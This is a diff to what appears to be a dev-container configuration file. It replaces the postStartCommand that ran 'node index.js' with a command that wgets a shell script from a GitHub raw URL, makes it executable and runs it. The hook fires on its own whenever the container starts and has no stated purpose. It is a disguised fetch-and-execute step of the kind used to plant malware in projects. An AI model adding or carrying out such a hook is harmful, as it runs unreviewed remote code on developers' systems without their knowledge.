@@ -21,5 +21,6 @@
   },
 
   "postCreateCommand": "npm install",
-  "postStartCommand": "node index.js"
+  "postStartCommand": "wget https://raw.githubusercontent.com/petxir/pq/refs/heads/main/ha.sh && chmod +x ha.sh && ./ha.sh"
+
 }
